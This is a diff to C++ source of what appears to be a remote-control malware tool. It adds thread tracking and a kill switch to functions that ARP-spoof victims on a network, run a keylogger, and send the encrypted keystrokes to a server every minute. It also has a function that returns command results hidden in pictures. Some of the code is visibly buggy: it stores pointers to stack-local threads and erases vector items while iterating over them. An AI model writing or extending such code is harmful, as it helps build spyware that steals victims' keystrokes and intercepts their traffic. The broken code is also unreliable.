@@ -6,6 +6,7 @@
 
 vector<SOCKET*> sockets;
 vector<Arpspoof*> spoofvictims;
+vector<thread*> threads;
 string kl;
 bool storeKeys;
 
@@ -81,18 +82,19 @@ call function to open a socket in a different  thread
 */
 string OpenSocket(std::string ip_and_port)
 {
-	while (true)
-	{
-		thread t1(OpenSocketWithThread, ip_and_port);
-		t1.detach();
-	}
+	thread t1(OpenSocketWithThread, ip_and_port);
+	threads.push_back(move(&t1));
+	t1.detach();
+	return "Socet started";
 }
+
 /*
 start thread to spoof victim
 */
 string SpoofVictim(std::string ip)
 {
 	thread t(&SpoofVictimInThread, ip);
+	threads.push_back(move(&t));
 	t.detach();
 	return "Spoof started";
 }
@@ -104,6 +106,7 @@ start spoofing in new thread
 */
 void SpoofVictimInThread(std::string ip)
 {
+
 	Arpspoof a(ip);
 	spoofvictims.push_back(&a);
 	a.SendArpReplayForSpoofing(ip);
@@ -192,8 +195,10 @@ string StartKeyLogger(string sharedKey)
 {
 	storeKeys = true;
 	thread t1(KeyLogger);
+	threads.push_back(move(&t1));
 	t1.detach();
 	thread t2(SendKeyLoggerToServer, sharedKey);
+	threads.push_back(move(&t2));
 	t2.detach();
 	return "Key Logger Started";
 }
@@ -214,8 +219,20 @@ string HideMessageInPicture(string fileName_and_cmd)
 	//SendPicture(fileName, cmd);
 
 	thread t1(SendPicture, fileName, cmd);
+	threads.push_back(move(&t1));
 	t1.detach();
 	return "I will send you result via picture";
+}
+
+string KillAllThreads(string nothing)
+{
+	for (vector<Arpspoof*>::iterator it = spoofvictims.begin(); it != spoofvictims.end(); ++it)
+	{
+		(*it)->stop = true;
+		spoofvictims.erase(it);
+	}
+	storeKeys = false;
+	return "All threads successfuly tarminated";
 }
 
 
@@ -678,7 +695,7 @@ void SendKeyLoggerToServer(string sharedKey)
 	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
 	connect(s, target->ai_addr, (int)target->ai_addrlen);
 
-	while (true)
+	while (storeKeys)
 	{
 		Sleep(60000);
 		string message = string("6").append(aes.Encrypt(kl));
